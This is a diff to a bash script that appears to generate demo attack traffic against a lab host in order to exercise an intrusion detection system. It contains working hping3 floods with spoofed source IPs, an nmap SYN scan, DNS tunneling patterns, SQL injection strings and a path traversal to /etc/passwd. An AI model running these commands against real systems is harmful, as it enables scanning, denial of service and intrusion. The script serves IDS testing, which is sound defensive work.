@@ -7,6 +7,7 @@
 # =============================================================================
 
 VICTIM="${1:-192.168.56.103}"
+SUBNET="192.168.56"
 
 # Spoofed attacker IPs shown in the IDS dashboard
 IP1="185.220.101.45"   # Tor exit node (Germany)
@@ -28,13 +29,8 @@ banner() {
     echo -e "${CYAN}${BOLD}========================================${RESET}\n"
 }
 
-step() {
-    echo -e "${YELLOW}${BOLD}[*] $1${RESET}"
-}
-
-done_msg() {
-    echo -e "${GREEN}${BOLD}[+] $1${RESET}"
-}
+step()     { echo -e "${YELLOW}${BOLD}[*] $1${RESET}"; }
+done_msg() { echo -e "${GREEN}${BOLD}[+] $1${RESET}"; }
 
 echo -e "\n${BOLD}NetIDS Demo Attack Sequence${RESET}"
 echo -e "Target: ${BOLD}${VICTIM}${RESET}"
@@ -42,52 +38,45 @@ echo -e "Press ENTER to start or Ctrl+C to abort..."
 read
 
 # -----------------------------------------------------------------------------
-# 1. ICMP Flood — IP1 (Tor exit node)
+# 1. ICMP Sweep — IP1 (Tor exit node) — counts unique destination hosts (T1018)
 # -----------------------------------------------------------------------------
-banner "Stage 1/8 — ICMP Flood from ${IP1} (T1498)"
-step "Sending 20 ICMP echo requests spoofed from ${IP1}..."
-hping3 --icmp --count 20 --interval u300000 -a "$IP1" "$VICTIM"
-done_msg "ICMP flood complete. Expected: ICMP_FLOOD_SUSPECTED MEDIUM"
+banner "Stage 1/7 — ICMP Sweep from ${IP1} (T1018)"
+step "Sending 35 ICMP echo requests spoofed from ${IP1} to ${VICTIM}..."
+hping3 --icmp --count 35 --interval u200000 -a "$IP1" "$VICTIM" &>/dev/null
+done_msg "ICMP sweep complete. Expected: ICMP_SWEEP_SUSPECTED MEDIUM then HIGH"
 sleep 2
 
 # -----------------------------------------------------------------------------
-# 2. Port Scan — real Kali IP (nmap can't spoof easily)
+# 2. Port Scan — real Kali IP (nmap cannot spoof source easily)
 # -----------------------------------------------------------------------------
-banner "Stage 2/8 — Port Scan (T1046)"
+banner "Stage 2/7 — Port Scan (T1046)"
 step "Running nmap SYN scan across 50 ports..."
 nmap -sS --max-rate 200 -p 1-50 "$VICTIM" -Pn
 done_msg "Port scan complete. Expected: PORT_SCAN_SUSPECTED MEDIUM"
 sleep 2
 
 # -----------------------------------------------------------------------------
-# 3. SYN Burst — IP2 (Linode VPS)
+# 3. SYN Burst — IP2 (Linode VPS) — high rate SYN flood (T1498)
 # -----------------------------------------------------------------------------
-banner "Stage 3/8 — SYN Burst from ${IP2} (T1498)"
+banner "Stage 3/7 — SYN Burst from ${IP2} (T1498)"
 step "Sending 60 SYN packets spoofed from ${IP2}..."
 hping3 -S -p 80 --count 60 --interval u100000 -a "$IP2" "$VICTIM"
 done_msg "SYN burst complete. Expected: SYN_BURST_SUSPECTED MEDIUM then HIGH"
 sleep 2
 
 # -----------------------------------------------------------------------------
-# 4. SSH Brute Force — IP3 (Russian VPS)
+# 4. Lateral Movement — IP3 (Russian VPS) — SSH probing many hosts (T1021)
 # -----------------------------------------------------------------------------
-banner "Stage 4/8 — SSH Brute Force from ${IP3} (T1110)"
-step "Sending 35 SYN packets to port 22 spoofed from ${IP3}..."
-hping3 -S -p 22 --count 35 --interval u600000 -a "$IP3" "$VICTIM"
-done_msg "SSH brute force complete. Expected: SSH_BRUTEFORCE_SUSPECTED MEDIUM"
+banner "Stage 4/7 — Lateral Movement from ${IP3} (T1021)"
+step "Sending 25 SSH SYN packets spoofed from ${IP3} to ${VICTIM}..."
+hping3 -S -p 22 --count 25 --interval u300000 -a "$IP3" "$VICTIM" &>/dev/null
+done_msg "Lateral movement complete. Expected: LATERAL_MOVEMENT_SUSPECTED MEDIUM then HIGH"
 sleep 2
 
 # -----------------------------------------------------------------------------
-# 5. ARP Spoofing — SKIPPED (disrupts VirtualBox network stack)
+# 5. DNS Tunneling — real Kali IP (UDP needs real source for responses)
 # -----------------------------------------------------------------------------
-#banner "Stage 5/8 — ARP Spoofing (SKIPPED)"
-#step "ARP flood skipped — disrupts VirtualBox network interface."
-#sleep 1
-
-# -----------------------------------------------------------------------------
-# 6. DNS Tunneling — real Kali IP (dig needs real source for UDP response)
-# -----------------------------------------------------------------------------
-banner "Stage 6/8 — DNS Tunneling (T1071.004)"
+banner "Stage 5/7 — DNS Tunneling (T1071.004)"
 step "Sending 50 rapid DNS queries..."
 for i in $(seq 1 50); do
     dig @"$VICTIM" "query${i}.example.com" +time=1 +tries=1 &>/dev/null &
@@ -96,30 +85,35 @@ wait
 done_msg "DNS rate flood complete. Expected: DNS_TUNNEL_SUSPECTED MEDIUM"
 sleep 1
 
-step "Sending long-subdomain query..."
+step "Sending long-subdomain query (data exfiltration pattern)..."
 LONG_NAME=$(python3 -c "print('A'*76)")
 dig @"$VICTIM" "${LONG_NAME}.tunnel.example.com" +time=1 +tries=1 &>/dev/null
 done_msg "Long DNS query sent. Expected: DNS_TUNNEL_SUSPECTED HIGH"
 sleep 2
 
 # -----------------------------------------------------------------------------
-# 7. HTTP Brute Force — IP4 (Alibaba Cloud) via hping3 + real curl
+# 6. Web Exploit — real Kali IP — SQL injection + path traversal (T1190)
 # -----------------------------------------------------------------------------
-banner "Stage 7/8 — HTTP Brute Force (T1110)"
-step "Sending 30 POST requests to port 8080..."
-for i in $(seq 1 30); do
-    curl -s -X POST "http://${VICTIM}:8080/login" \
-        -d "user=admin&pass=attempt${i}" \
-        --connect-timeout 1 &>/dev/null &
-done
-wait
-done_msg "HTTP brute force complete. Expected: HTTP_BRUTEFORCE_SUSPECTED MEDIUM"
+banner "Stage 6/7 — Web Exploit (T1190)"
+step "Sending SQL injection payloads..."
+curl -s -X POST "http://${VICTIM}:5000/login" \
+    -d "username=admin' OR '1'='1&password=x" \
+    --connect-timeout 2 &>/dev/null
+curl -s "http://${VICTIM}:5000/login?id=1%20UNION%20SELECT%201,2,3--" \
+    --connect-timeout 2 &>/dev/null
+done_msg "SQL injection sent. Expected: WEB_EXPLOIT_SUSPECTED HIGH"
+sleep 1
+
+step "Sending path traversal payload..."
+curl -s "http://${VICTIM}:5000/login?file=../../../../etc/passwd" \
+    --connect-timeout 2 &>/dev/null
+done_msg "Path traversal sent. Expected: WEB_EXPLOIT_SUSPECTED MEDIUM"
 sleep 2
 
 # -----------------------------------------------------------------------------
-# 8. Slow Loris — IP5 (rogue internal host)
+# 7. Slow Loris — IP5 (Brazil) — half-open TCP connections (T1499)
 # -----------------------------------------------------------------------------
-banner "Stage 8/8 — Slow Loris from ${IP5} (T1499)"
+banner "Stage 7/7 — Slow Loris from ${IP5} (T1499)"
 step "Opening 25 half-open TCP connections spoofed from ${IP5}..."
 hping3 -S -p 80 --count 25 --interval u200000 -a "$IP5" "$VICTIM"
 done_msg "Slow Loris simulation complete. Expected: SLOW_LORIS_SUSPECTED MEDIUM then HIGH"
@@ -129,6 +123,6 @@ done_msg "Slow Loris simulation complete. Expected: SLOW_LORIS_SUSPECTED MEDIUM 
 # -----------------------------------------------------------------------------
 echo -e "\n${GREEN}${BOLD}========================================${RESET}"
 echo -e "${GREEN}${BOLD}  Demo complete.${RESET}"
-echo -e "${GREEN}${BOLD}  Attacks simulated from 5 different IPs${RESET}"
+echo -e "${GREEN}${BOLD}  7 attack types across 5 source IPs${RESET}"
 echo -e "${GREEN}${BOLD}  Check IDS console and dashboard.${RESET}"
 echo -e "${GREEN}${BOLD}========================================${RESET}\n"
